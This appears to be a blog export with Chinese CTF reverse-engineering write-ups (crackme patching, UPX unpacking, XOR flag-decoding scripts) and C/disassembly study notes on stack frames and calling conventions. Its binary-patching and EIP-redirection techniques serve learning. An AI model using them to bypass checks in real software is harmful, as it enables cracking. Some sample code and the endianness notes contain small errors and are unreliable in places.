re1第一步，先查壳：（查壳很重要，可以先确认是否有壳还可以知道程序是什么语言编写的）看下程序是干嘛的，也就是你输入flag然后程序出个判断是否正确。估计就是个明文对比，直接od打开：断在了re模块。直接搜索字符串拿到flag game还是先查壳：无壳这道题有多种做法，下面展示三种： 第一种这个做法主要是判断程序逻辑，然后改关键跳转的汇编代码，进行爆破破解。先看下程序是做什么的：先输入个1发现图案中第1，2，8行图形发生了变化。接着输入2，然后第3，4，8行图形发生了变化。感觉没什么规律，大概猜一下，应该是这8行的线条全部连通就可以完成这个游戏。 打开IDA进行静态分析发现一堆函数难以找到主函数，按shift+F12查看字符串点击这个，查看一下这个字符串的交叉引用，然后可以双击跳转到main函数，看整个程序的逻辑。 跳转好后按F5查看伪代码：在下方发现了一个判断语句，满足后会调用sub_45Ab4这个函数。双击进入看看这个函数做了什么：发现会出现这个字符串，然后：还经过一堆数据和异或后返回一个字符串。那这个应该就是返回flag了。那就是想办法让程序调用sub_45Ab4这个函数就可以了。再看一下这个if语句里面正好是对一个容量为8的数组进行判断，对应刚刚程序中的8行，正好对应当8行直线全部连接（也可以认为是图案全变）就会调用输出flag的函数。 那现在需要做的就很明确的，直接改程序流程，IDA的patch是可以做到的，结合刚刚我们输入1的时候回让1，2，8行进行改变，那我们就在这几处做改变就可以了。 IDA Patch看主函数的流程图模式，专门找这个跳转指令JNZ，数一下8个就是刚刚的8个判断了。对应刚刚的想法我们在这几处的汇编代码进行patch：把JNZ改成正好相反的JZ 修改好后查看下生成的伪代码达到了我们想要的结果。然后我们需要把这些打patch的地方保存下来，让其成效：点击ok即可，可以为了安全选择一下做个bak备份。 验证输入1拿到了flag。 第二种这种主要是在IDA中静态分析后知道了，在程序调用输出flag函数后flag就打印出来了。就可以想办法在动态调试中直接调用这个函数就可以了。重在IDA和OD搭配使用了。 IDA寻找输出flag函数的函数地址记住这个0045E940 地址。下面OD直接想办法执行到该地址 OD动态调试发现基地址是010F在OD中搜索字符串，找一下我们应该在哪个地方找一个合适的可以控制的代码段。发现了输入n的语句地址。设置一个断点，运行程序。F9让程序运行到这里断下来。按空格修改下汇编代码jmp 0x010FE490 这时候的EIP，然后单步执行过来了，到了调用输出flag的函数。然后接下来会有很多循环和字符处理的操作，直接可以按CTRL+F8按键让OD自动执行。让把这个函数处理完，就会出现flag字符串。 这种修改EIP是重点和找到合适可控制代码段是重点，我们还可以在找到一个可以控制代码后，在搜索字符串中找到单击过去，然后在这个函数的开头设置为新的EIP然后按一下F8就来到了这个函数里面了。再进行刚刚的操作就可以了。 第三种这个就是我们找到了关键函数，分析以后是可以把这个函数是写出来的，然后根据伪代码写出原来的程序就可以了。 OD静态分析调用其函数。双击进入F5生成伪代码：（只是截取一部分）分析可以得知是分成了2个字符数组，一个V2到V58，一个V59到V115，都是56的长度，然后下面就是两个异或操作了。直接改成C代码，因为还不会写Python。 #include &lt;iostream&gt; #include &lt;string.h&gt; int main() { int i; char arr1[]={123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0}; char arr2[]={18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0}; for ( i = 0; i &lt; 56; ++i ) { arr1[i] ^= arr2[i]; arr1[i] ^= 0x13u; } printf(&quot;%s&quot;,arr1); return 0; }运行就拿到了flag。 Hello, CTF根据题目描述：菜鸡发现Flag似乎并不一定是明文比较的肯定是进行了某种加密。 先查壳无壳，32位c++程序 运行程序输入正确的serial，会提示正确。 IDA静态分析进入main函数，F5大法查看伪代码发现是v10数组与v13数组逐对比后，如果相同就会输出正确的字眼。前面有对用户输入的v9进行一些处理，处理完后会放入v10中。下面具体分析一下如何处理就可以了，主要在sprintf函数和strcat函数。点击进去看到那就很清楚了，就是把v4字符串也就是刚刚输入的字符串进行格式化位16进制的整数输出到v8中，然后用strcat函数把处理后的v8放入v10。（此处原来的v10是空的，所以连接v10和v8，实际相当于把v8放入v10） 接下来就是v10与v13进行对比，v13是刚刚复制过来的437261636b4d654a757374466f7246756e，那就可以看出来咱们直接把这个进行16进制转回去就可以了。 open-source这道题是拿到了一段c源码，打开发现关键处：可以看出来把first second strlen(argv[3])搞清楚是什么就可以了。很简单可以看出这3个是什么值，下面直接放解密代码： #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;iostream&gt; int main(int argc, char *argv[]) { unsigned int hash = 0xcafe * 31337 + (25 % 17) * 11 + strlen(&quot;h4cky0u&quot;) - 1615810207; printf(&quot;Get your key: &quot;); printf(&quot;%x\\n&quot;, hash); return 0; }拿到flag： simple-unpack分析这个看题目就是知道加了壳。且是个二进制文件，丢进edb看一下。 单步调试走一会，在寄存器窗口看到：这很明显是加了UPX壳。 脱壳这里就用upx -d直接一键脱壳。以后可以练习手动脱upx壳。脱壳完成后用IDA进行分析： IDA静态分析打开直接出现了flag，这个题就考个识别壳和upx脱壳了。 logmein先查看一下，无壳，elf 64位应用。 IDA静态分析点击此处出现了：确认关键代码段。开始对这个循环进行分析，需要对v8 v7 v9重点分析。这里面难点就在如何对v8的理解。 v8与关键加密分析v8是一个_int64也就是long long类型的数值，其存入内存需要变成16进制的数值存入。刚刚我们注意到这个x86框架x64的程序，其在内存是用小端序存入的，也就是地址高位放数值高位，地址低位放地址低位。那么其放好就是正好是反过来的。然后分析一下加密代码，这主要就是指针知识了：v4 = (unsigned int)(char)(*((_BYTE *)&amp;v8 + i % v7) ^ v9[i]);这里的（char）是给long long强制转型，然后为了后面的以2位16进制数也就是一个字节，来读取数值。i % v7其是就是控制i = 0—6正好把这个v8给正确读取完。然后一位位取完v8后开始跟v9异或。 脚本解密#include &lt;iostream&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { int v6; char v7[]=&quot;harambe&quot;; v6 = 7; char v8[18]; strcpy(v8, &quot;:\\&quot;AL_RT^L*.?+6/46&quot;); char s[18]; int i; for ( i = 0; i &lt; strlen(v8); ++i) { s[i] =v7[i%v6]^v8[i]; } for (int j = 0; j &lt; strlen(v8); ++j) { printf(&quot;%c&quot;,s[j]); } return 0; } 对于大小端序的知识补充数据类型为字节型( BYTE)时，其长度为1个字节,保存这样的数据时，无论采用大端序还是小端序，字节顺序都是一样的。但是数据长度为2个字节以上(含2个字节)时，采用不同字节序保存它们形成的存储顺序是不同的。采用大端序存储数据时，内存地址低位存储数据的高位，内存地址高位存储数据的低位，这是一种最直观的字节存储顺序;采用小端序存储数据时,地址高位存储数据的高位，地址低位存储数据的低位，这是一种逆序存储方式，保存的字节顺序被倒转，它是最符合人类思维的字节序。 强调：只有数据长度在2个字节以上时，即数据为多字节数据时，选用大端序还是小端序会导致数据的存储顺序不同。字符串“abcde” 被保存在一个字符 ( Char )数组str中,字符数组在内存中是连续的，此时向字符数组存放数据，无论采用大端序还是小端序，存储顺序都相同。 insanity这个没什么好说的，主函数点击一下他要打印的字符串就可以看到了flag，当然shift + f12也是可以看到。 no-strings-attachedcsaw2013reversing2getitpython-trademaze","categories":[],"tags":[{"name":"Re","slug":"Re","permalink":"http://chumen77.xyz/tags/Re/"},{"name":"WP","slug":"WP","permalink":"http://chumen77.xyz/tags/WP/"}]},{"title":"C语言与反汇编学习（四）","slug":"C语言与反汇编学习（四）","date":"2019-10-23T14:48:14.000Z","updated":"2020-02-28T07:53:42.000Z","comments":true,"path":"2019/10/23/C语言与反汇编学习（四）/","link":"","permalink":"http://chumen77.xyz/2019/10/23/C语言与反汇编学习（四）/","excerpt":"","text":"C语言与反汇编学习（四）前言本次主要学习以下内容 内存图 全局变量、局部变量 函数参数的分析 分支语句:if if...else... if..else if..else if....else分支语句的嵌套使用``的正向与逆向分析 内存图在电脑中任何一个程序运行时，其会在内存中分成以上图中的几个区域。详细每个区是怎么样的，直接看图即可。 全局变量、局部变量int g_n = 10; //全局变量 int Funcation() //代码区，调用时执行 { int x = 1;//局部变量 int y = 3; return g_n+x+y; } }就用这个代码段来分析。 全局变量的特点1、全局变量在程序编译完成后地址就已经确定下来了，只要程序启动，全局变量就已经存在了，启动后里面是否有值取决于声明时是否给定了初始值，如果没有，默认为0。2、全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值.3、全局变量所占内存会一直存在，知道整个进程结束.4、全局变量的反汇编识别：MOV 寄存器,byte/word/dword ptr ds:[0x12345678]通过寄存器的宽度，或者byte/word/dword 来判断全局变量的宽度.全局变量就是所谓的基址。 局部变量的特点1、局部变量在程序编译完成后并没有分配固定的地址.（因为计算机不知道什么时候会调用这个函数，所以不会提前分配好）2、在所属的方法没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存.3、当局部变量所属的函数执行完毕后，局部变量所占用的内存将变成垃圾数据.局部变量消失.4、局部变量只能在函数内部使用，函数A无法使用函数B的局部变量.（从堆栈图中也可以想象的到原理）5、局部变量的反汇编识别：[ebp-4][ebp-8][ebp-0xC]等等类似的情形。 函数参数的分析如何判断函数有几个参数，已经分别是什么？ 一般情况： 步骤一：观察调用处的代码 push 3 push 2 push 1 call 0040100f 步骤二：找到平衡堆栈的代码继续论证 call 0040100f add esp,0Ch或者函数内部 ret 4/8/0xC/0x10最后，两者一综合，函数的参数个数基本确定.可以应对百分之八十的情况。 但剩下的百分之二十呢？上面的分析存在的问题：1、参数传递未必都是通过堆栈，还可能通过使用寄存器.例： push ebx push eax mov ecx,dword ptr ds:[esi] mov edx,dword ptr ds:[edi] push 45 push 33 call 函数地址2、函数调用处的代码无法查看.例：进入函数查看汇编代码： 00401050 push ebp 00401051 mov ebp,esp 00401053 sub esp,48h 00401056 push ebx 00401057 push esi 00401058 push edi 00401059 push ecx 0040105A lea edi,[ebp-48h] 0040105D mov ecx,12h 00401062 mov eax,0CCCCCCCCh 00401067 rep stos dword ptr [edi] 00401069 pop ecx 0040106A mov dword ptr [ebp-8],edx 0040106D mov dword ptr [ebp-4],ecx 00401070 mov eax,dword ptr [ebp-4] 00401073 add eax,dword ptr [ebp-8] 00401076 add eax,dword ptr [ebp+8] 00401079 mov [g_x (00427958)],eax 0040107E pop edi 0040107F pop esi 00401080 pop ebx 00401081 mov esp,ebp 00401083 pop ebp 00401084 ret 4 观察步骤：1、不考虑ebp、esp2、只找给别人赋值的寄存器eax/ecx/edx/ebx/esi/edi3、找到以后追查其来源，如果，该寄存器中的值，不是在函数内存赋值的，那一定是传进来的参数.**公式一：寄存器 + ret 4\\8\\0C = 参数个数公式二：寄存器 + [ebp+8]+[ebp+0x] = 参数个数**这两个公式可以互相结合验证看是否算的对。如以上代码段，只可以找到edi,ecx,edx给别人赋值，但是其中edi ecx都是函数内存赋的值，所以只剩下edx，在加上最后的ret 4（这个肯定是push进来了一个参数）就等于2，也就是2个参数。与公式二检验发现没问题，[ebp+0x]类似的只出现一个. 分支语句正向代码练习 练习1:定义4个int类型的全局变量，分别是g_x,g_y,g_z,g_r,使用if..else..分支语句，将最大的值存储到g_r中。 #include “stdafx.h” int g_x = 5; int g_y = 3; int g_z = 7; int g_r = 0; void getMax() { if(g_x&gt;g_y) { if (g_x&gt;g_z) { g_r=g_x; } else{ g_r=g_z; } } else if (g_y &gt; g_z) { g_r=g_y; } else g_r=g_z; printf(“%d\\n”,g_r); } int main(int argc, char* argv[]) { getMax(); return 0; } 练习2:找出数组里面最大的值，并存储到全局变量中 #include “stdafx.h” int a[4] = {2,5,7,9}; int g_r = 0; void getMax() { if(a[0]&gt;a[1]) { if (a[0]&gt;a[2]) { if (a[0]&gt;a[3]) { g_r=a[0]; } else g_r=a[3]; } else if(a[2]&gt;a[3]){ g_r=a[2]; } else g_r=a[3]; } else if (a[1] &gt; a[2]) { if (a[1]&gt;a[3]) { g_r=a[1]; } else g_r=a[3]; } else if (a[2] &gt; a[3]) { g_r=a[2]; } else g_r=a[3]; printf(“%d\\n”,g_r); } int main(int argc, char* argv[]) { getMax(); return 0; } 感悟1：分支语句中if else,及其相互套用，要知道当某个条件成功后，执行其中的代码，然后以后于它的代码都不会再进行判断和执行。2：一个if只对应于一个else，else只能在if后出现与其搭配使用。 逆向分析IF语句逆向分析特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的近end中没有jmp指令。根据以上特征，把jxx指令取反后，即可还原if语句的代码。（我们要知道jcc代码跳转语句，其判断条件正好跟c的if判断条件是正好反过来的。）汇编代码：对于这段代码我们采取一定的分析顺序来分析： 分析参数：[ebp+8] : X [ebp+0Ch] :Y 分析局部变量 无 分析全局变量 mov dword ptr 004225c4,ecx 功能分析:将参数X存到到EAX中，然后比较EAX,与参数Y的大小.如果X&lt;=Y 那么跳转到00401059的位置,否则，将X的值存储到全局变量中 返回值分析 无 练习： 分析参数：[ebp+8] : X [ebp+0Ch] :Y 分析局部变量 [ebp-4]：a 分析全局变量 mov eax,[004225c4]: m 功能分析:(省略，直接以c语言代码表示) 返回值分析 无 逆为c函数： int m=1; void Funcation(int x, int y) { int a; a=m; if(x&lt;=y) { y=y+a; m=y; } } IF…ELSE…语句逆向分析if..ees语句比if语句多出了-一个“else” ，当if表达式结果为真时跳过else分支语句块，当表达式结果为假时跳转到else 分支语句块中。特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else中有的上方有jmp指令。else 代码的结尾没有jmp指令，else 的代码也会执行if _else. _end 的代码。根据以上特征，把jxx指令取反后，即可还原if…ese语句的代码总结：跳转执行一部分代码，不跳转执行另外一部分代码汇编代码：同样安装一定的顺序： 1：分析参数：[ebp+8] : X [ebp+0Ch] :Y2：分析局部变量 [ebp-4] = eax = [004225c4]3：分析全局变量 [004225c4] G4：功能分析:比较X与Y的大小，如果X&lt;=Y那么执行如果X&gt;Y 那么执行5：返回值分析 无练习： 分析参数：[ebp+8] : X [ebp+0Ch] :Y 分析局部变量 [ebp-4]：eax:[004225c4]:a [ebp-8]:b:2 分析全局变量 mov eax,[004225c4] 功能分析:(省略，直接以c语言代码表示) 返回值分析 无 还原成c函数： int m=1; void Funcation(int x,int y) { int a,b; a=m; b=2; if (x&gt;=y) { b=b+1; if (x&lt;y) { m=b; }else m=a+b; } } IF…ELSE IF…ELSE逆向分析特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else if中有jmp指令。else if的跳转目的else中有jmp指令，且else码的结尾没有jmp指令，所有jmp的目标地址一致。根据以上特征，把jxx指令取反，即可还原if…else if….else语句的代码。如果某个分支没有条件判断，则为else部分。汇编代码： 函数内部功能分析： 1、分析参数：[ebp+8] X [ebp+0Ch] Y [ebp+10h] Z 2、分析局部变量 [ebp-4] = A = 0 [ebp-8] = B = 1 [ebp-0Ch] = C = 2 3、分析全局变量 无 4、功能分析 if(x&gt;y) { A = B+1; } else if(x&gt;z) { A = C+1; } else if(x&gt;z) { A = B+C } else { A = B+C+1; } return A; 练习：1、分析参数：[ebp+8] X [ebp+0Ch] Y [ebp+10h] Z 2、分析局部变量 [ebp-4] = A [ebp-8] = B [ebp-0Ch] = C 3、分析全局变量 无 4.返回值分析 a+1 还原成C函数： int Funcation(int x,int y,int z) { int a=0; int b=1; int c=2; if (x&lt;=y) { a=b-1; } else if (y&gt;=z) { a=c+1; } else if (x&gt;z) { a=b+c; } else a=b+c-1; return a+1; } 感悟每个分支类型都有自己的特征点，记清楚这个后，分析起来会容易很多。","categories":[],"tags":[{"name":"c与汇编","slug":"c与汇编","permalink":"http://chumen77.xyz/tags/c与汇编/"}]},{"title":"C语言与反汇编学习（三）","slug":"C语言学习与反汇编（三）","date":"2019-10-20T15:45:40.000Z","updated":"2020-02-28T07:53:44.000Z","comments":true,"path":"2019/10/20/C语言学习与反汇编（三）/","link":"","permalink":"http://chumen77.xyz/2019/10/20/C语言学习与反汇编（三）/","excerpt":"","text":"C语言与反汇编学习（三）前言本次主要学习一下C语言的数据类型与数据存储。 数据类型 学习数据类型的三个要素1、存储数据的宽度2、存储数据的格式3、作用范围(作用域)这些都是谈起一个数据类型的基本要素。 整数类型：char short int long char 8BIT 1字节 short 16BIT 2字节 int 32BIT 4字节 long 32BIT 4字节 char i = 0xFF; short x =0xFF; long y =0xFF;我们来看下在汇编其是什么样的：注意byte word dword的区别。然后我们测试一下以下代码： char i = 0x12345678; short x = 0x12345678; long y = 0x12345678;然后看到还是byte word dword，并且也没有报错，但是我们运行以后可以看到这就说明你写了32位的数给char i这个8位的容器，这是允许的，但是只能装下8位，就从低位开始把78放入。 整数类型分为有符号(signed)和无符号(unsigned)两种： char i = 0xFF; unsigned char i = 0xFF;要知道其在内存里存着显示的都是FF但是输出打印出来一个是255 一个是-1，这就是说明在内存中存储的方式完全一样，但会根据你的定义来确实其是有符号还是无符号。其默认是有符号的，当你想用无符号的时候需要你来定义。并且这个只有在类型转换和大小比较中特别注意。因为你直接定义个无符号数，其在内存放的是和原来有符号数一样的，只是你在比较时编译器在编译的时候，会把其会把汇编代码跳转那里改成特定对应的JCC代码（只要针对无符号，因为默认是有符号的）。例子：无符号数比较，jcc是JBE，原来没有指定是无符号时，其是JLE（有符号）总结：1：在内存中存储的方式完全一样 。 2：在类型转换和大小比较中特别注意（运算）。 浮点类型：float doublefloat和double在存储方式上都是遵从IEEE的规范的float的存储方式如下图所示：double的存储方式如下图所示： 将一个float型转化为内存存储格式的步骤为: 先将这个实数的绝对值化为二进制格式 将这个二进制格式实数的小数点左移或右移n位，直到小数点移动到第一个有 效数字的右边。 从小数点右边第一一位开始数出二十三位数字放入第22到第0位。 如果实数是正的，则在第31位放入“0”，否则放入“1”。 如果n是左移得到的，说明指数是正的，第30位放入“1”。如果n是右移得到的或n=0，则第30位放入“0”。 如果n是左移得到的，则将n减去1后化为二进制，并在左边加“0”补足七位，放入第29到第23位。 如果n是右移得到的或n=0，则将n化为二进制后在左边加“0’补足七位，再各位求反，再放入第29到第23位。 这是官方解释。有点麻烦。先练习一个：8.25转成浮点存储所以8.25用二进制表示可表示为1000.01，科学计数法表示一下：1.00001X2^3小数点向左移动3位 指数为3，然后按照上面先放第一个空格0（因为是正数），接着放最后一个大格子00001（科学计数法表示后从小数点后），然后中间格子第一位1（因为是左移小数点），指数3-1=2变成二进制10从右边开始放入。这就是IEEE规范。(可以感受到最麻烦就是中间这段的确定值)按四位分割0100 0001 0000 0100 0000 0000 0000 0000=41040000，然后就这样的形式存入计算机内存。 我下面用简单的且是正确的办法来转换：将float类型的12.5 转换成16进制：先整理正数部分，12=C=1100小数部分 0.5 * 2=1.0所以二进制就是1100.1，科学计数法 1.1001x2^3这次对中间格子是直接用127+x的结果 变成二进制填充这个格子，x的值就是指数，其中左移是正右移为负 double类型前面讲解了单精度浮点类型的IEEE编码。double类型和float类型大同小异，只是double类型表示的范围更大，占用空间更多，是float类型所占用空间的两倍。当然，精准度也会更高。 double类型占8字节的内存空间，同样，最高位也用于表示符号，指数位占11位，剩余42位用于表示位数。在float中，指数位范围用8位表示，加127后用于判断指数符号。在double中，由于扩大了精度，因此指数范围使用11位正数表示，加1023后可用于指数符号判断。 double类型的IEEE编码转换过程与float 类型一样，可根据float类型的转换流程来转换double类型。 英文字符存储char x = ‘A’;对于一个英文字符，编译器会自动查ASCII表获取其定义的7位二进制数，然后转换存储其16进制放入内存中。例：补充： 标准 ASCII 码使用 7 位二进制数来表示所有的大写和小写字母，数字 0 到 9、标点符号，以及在美式英语中使用的特殊控制字符。 ASCII 码使用指定的 7 位或 8 位二进制数组合来表示 128 或 256 种可能的字符。 扩展 ASCII 码允许将每个字符的第 8 位用于确定附加的 128 个特殊符号字符、外来语字母和图形符号。 为什么不是八位二进制呢？因为其第一位都是0，没必要记录，在起初7位已经满足需求。","categories":[],"tags":[{"name":"c与汇编","slug":"c与汇编","permalink":"http://chumen77.xyz/tags/c与汇编/"}]},{"title":"C语言与反汇编学习（二）","slug":"C语言与反汇编学习（二）","date":"2019-10-19T15:49:13.000Z","updated":"2020-02-28T07:53:46.000Z","comments":true,"path":"2019/10/19/C语言与反汇编学习（二）/","link":"","permalink":"http://chumen77.xyz/2019/10/19/C语言与反汇编学习（二）/","excerpt":"","text":"C语言与反汇编学习（二）前言本次主要学习一下c是如何变成汇编的，查找程序入口，调用约定，和主要练习使用__declspec(naked)裸函数实现部分简单的功能和完整的逆一个简单EXE成c语言。 裸函数什么是裸函数？void __declspec(naked) Function() {.....}在代码中申明函数后，编译时，除了入口参数压栈外，然后就是call这个函数，编译器不会为函数体生成任何代码。 运行裸函数为什么会出错以上的裸函数运行后，因为编译器除了入口参数压栈外，然后就是call这个函数，不会给其生成任何的汇编代码，所以明显运行后其无法回到原来的主函数，然后堆栈是不平衡的。所以： void __declspec(naked) Function() { __asm ret }加一个ret就好了，不会再报错了。 裸函数框架简单集合无参数无返回值的函数框架void __declspec(naked) Function() { __asm { push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret } }有参数有返回值的函数框架void __declspec(naked) Function() { __asm { push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd //主要功能 mov eax,dword ptr ds:[ebp+8] add eax,dword ptr ds:[ebp+0xC] pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret } }带局部变量的函数框架void __declspec(naked) Function() { __asm { push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd //主要功能 mov dword ptr ds:[ebp-4],2 mov dword ptr ds:[ebp-8],3 mov eax,dword ptr ds:[ebp+8] add eax,dword ptr ds:[ebp+0xC] //注意汇编中局部变量的存放办法 pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret } }在练习中发现对局部变量在汇编中如何存放，如何体现有些生疏，特此记录一下。 针对裸函数的练习目标是要实现以下功能： int plus(int x,int y,int z) { int a = 2; int b = 3; int c = 4; return x+y+z+a+b+c; }代码： // Day2.cpp : Defines the entry point for the console application. // #include &quot;stdafx.h&quot; int __declspec(naked) plus(int x,int y,int z) { __asm { push ebp mov ebp,esp sub esp,0x40 //开栈 push ebx push esi push edi //保护现场 lea edi,dword ptr ds:[ebp-0x40] mov ecx,0x10 mov eax,0xCCCCCCCC rep stosd //为缓冲区填充数据 //真正要执行的功能 //局部变量：EBP—4开始 参数：ebp+8开始 //ebp+4是eip 原来call下条语句 mov eax,0x2 mov dword ptr ds:[ebp-0x4],eax mov eax,0x3 mov dword ptr ds:[ebp-0x8],eax mov eax,0x4 mov dword ptr ds:[ebp-0x0C],eax //放入局部变量 mov eax,dword ptr ds:[ebp+0x8] add eax,dword ptr ds:[ebp+0x0C] add eax,dword ptr ds:[ebp+0x10] add eax,dword ptr ds:[ebp-0x4] add eax,dword ptr ds:[ebp-0x8] add eax,dword ptr ds:[ebp-0x0C] mov dword ptr ds:[ebp-0x4],eax //把计算结果放入栈中，下面主函数打印a时要用到 pop edi; pop esi; pop ebx; mov esp,ebp pop ebp ret } } int main(int argc, char* argv[]) { int a; a=plus(6,7,8); printf(&quot;%d\\n&quot;,a); return 0; }练习这个可以更加熟悉堆栈结构，参数、局部变量的位置。 程序真正的入口main 或WinMain 是“语法规定的用户入口”，而不是“应用程序入口”。应用程序入口通常是启动函数。 在OD中默认设置就是到winmain入口就暂停程序，其并不是主函数入口。其实每一种编译器都有自己一套的编译标准，在主函数启动前要做一些必要的准备工作，下面我分析的是vc6.0的。 main 函数的识别与寻找只是vc++6.0main 函数被调用前要先调用的函数如下： GetVersion() _heap_init() GetCommandLineA() _crtGetEnvironmentStringsA() _setargv() _setenvp() _cinit() 这些函数调用结束后就会调用main 函数，根据main 函数调用的特征，将3个参数压入栈内作为函数的参数。所以在winmain停下后，可以一直单步调试，遇到call的时候，注意前方是不是有3个参数被压入栈了，是的话这个可以基本判断它call的就是main函数直接步过进去即可，但是这个也不是一定的，结合智能od的注释，注释有win内核函数调用就不要进入函数就可以了。 函数调用约定常见的几种约定： cdecl使用VC++ (关闭优化选项)编译代码生成cdecl.exe文件后，使用OllyDbg调试:函数的参数1、2以逆序方式压人栈，调用Plus(函数( 401014)后，使用ADD ESP,8命令整理栈。调用者main()函数直接清理其压入栈的函数参数，这样的方式即是cdecl。 stdcallstdcall常用于win32 api，在往后的VB中很常见。这个是自身函数内部进行栈清理。若想使用stdcall方式编译源码，只要使用_ stdcall关键字即可。栈的清理工作由add(函数中最后( 40100F)的RETN 8命令来执行。RETN 8命令的含义为RETN+POP 8字节，即返回后使ESP增加到指定大小。 像这样在被调用者add)函数内部清理栈的方式即为stdcall方式。stdcall方式的好处在于， 被调用者函数内部存在着栈清理代码，与每次调用函数时都要用ADD ESP,XXX命令的cdecI方式相比，代码尺寸要小。 虽然Win 32 API是使用C语言编写的库，但它使用的是stdcall方式，而不是C语言默认的cdecl方式。这是为了获得更好的兼容性，使C语言之外的其他语言( Delphi(Pascal)、Visual Basic等)也能直接调用API。 fastcallfastcal方式与stdcall方式基本类似，但该方式通常会使用寄存器(而非栈内存)去传递那些需要传递给函数的部分参数(前2个)。若某函数有4个参数，则前2个参数分别使用ECX、EDX寄存器传递。 顾名思义，fastcall方式的优势在于可以实现对函数的快速调用(从CPU的立场看，访问寄存器的速度要远比内存快得多)。单从函数调用本身来看，fastcall方式非常快，但是有时需要额外的系统开销来管理ECX、EDX寄存器。倘若调用函数前ECX与EDX中存有重要数据，那么使用它们前必须先备份。此外,如果函数本身很复杂，需要把ECX、EDX寄存器用作其他用途时，也需要将它们中的参数值存储到另外某个地方。有舍也有得。 就跟这种情况，一定要注意其是直接用寄存器来传参和计算的，不涉及栈，不过这个不常用。这个就是常用的情况，传参的时候会把部分的参数用寄存器来传。 第一次完整逆一个exe（CallingConvention.exe）汇编分析简单一看，这个就是停在winmain入口了，注意寻找前面所说的那个找call之前有3个参数压栈最为函数参数的语句，一直单步走：疑似出现符合的情况，这时候按F7进去查看内部：简单一看，就是我们要找的main函数。接下来为了加强分析可观性，我把汇编代码都放进了WPS中进行分析：（箭头指的不是特别好……） 逆成c代码#include &quot;stdafx.h&quot; int __stdcall plus2(int a,int b,int c) { return a+b+c; } int __cdecl plus3(int a,int b) { return a+b; } int __fastcall plus(int a,int b,int c,int d,int e) { int z,s; z=plus2(a,b,c); s=plus3(b,a); return plus3(z,s); } int main(int argc, char* argv[]) { int x; x=plus(1,3,4,6,7); printf(&quot;%d\\n&quot;,x); return 0; }这个练习过程其实是十分艰难的，我分析了有一个小时左右，主要是 开始对局部变量有些生疏，函数内部定义一个变量后汇编中会如何显示、 fastcall的认识不是很好 传入的6 7做了什么也不是很清楚最后结合ida生成的伪代码才完成，不过经过这个练习都学到了很多，使用ida也感受到了ida的强大，学到了在其中如何看一些简单的函数以及其与真正汇编代码的区别。","categories":[],"tags":[{"name":"c与汇编","slug":"c与汇编","permalink":"http://chumen77.xyz/tags/c与汇编/"}]},{"title":"C语言与反汇编学习（一）","slug":"C语言与反汇编学习（一）","date":"2019-10-19T02:26:17.000Z","updated":"2020-02-28T07:53:48.000Z","comments":true,"path":"2019/10/19/C语言与反汇编学习（一）/","link":"","permalink":"http://chumen77.xyz/2019/10/19/C语言与反汇编学习（一）/","excerpt":"","text":"C语言与反汇编学习（一）前言：本课主要学习VC开发环境的简单使用，和几个函数反汇编分析。 简单下熟悉VC6开发环境这里我直接用了编程达人的vc虚拟机，官方的vc6.0不是很好用，每次只支持调试一次，人家的可以突破这个限制。 创建项目 执行过程代码编写–&gt;生成EXE(F7)–&gt;运行(F5)–&gt;结束运行(Shift+F5) 一些简单操作设置断点设置断点是光标放到哪行代码后按下F9即可，这也是后面很多操作的最重要的起初操作。 调出寄存器，栈，内存窗口调出寄存器，栈，内存窗口看图，在空白处右击点击一下你需要的窗口就好了。 进入反汇编窗口在程序运行时，且有适当断点的时候，看图 右击程序框内的空白处，然后点击GO to Disassembly 就好了。在这里面最重要的操作就是：F10 F11分别是步过和步入。这个跟od里不一样。 C语言的调用1、无参数，无返回值的函数调用2、有参数，无返回值的函数调用3、无参数，有返回值的函数调用4、有参数，有返回值的函数调用 函数的反汇编分析-空函数先上c：#include &quot;stdafx.h&quot; void Function() { } int main(int argc, char* argv[]) { Function() return 0; }反汇编分析： 函数的反汇编分析-简单功能两个数相加：c代码：#include &quot;stdafx.h&quot; void Plus(int x,int y) { return x+y; } int main(int argc, char* argv[]) { Plus(2,1); return 0; }反汇编分析： 三个数相加：c代码：#include &quot;stdafx.h&quot; void Plus(int x,int y，int z) { return x+y; } int main(int argc, char* argv[]) { Plus(2,1,3); return 0; }反汇编分析：（和上面那个基本一样，只是为了练习，不详细写了） 函数的反汇编分析-嵌套调用要求：编写一个函数，能够实现对任意5个整数实现加法(使用Plus1和Plus2). c代码#include &quot;stdafx.h&quot; int Plus1(int x,int y) { return x+y; } int Plus2(int x,int y,int z) { return x+y+z; } int Plus3(int a,int b,int c,int d,int e) { int i,j,m; i=Plus1(a,b); j=Plus2(c,d,e); m=Plus1(i,j); return m; } int main(int argc, char* argv[]) { Plus3(2,1,3,1,5); return 0; }反汇编分析：（中间调用一个Plus1 和 Plus2，就不必进入分析了，基本跟前面简单分析那两个一样，这个练习是顺成下来的。） 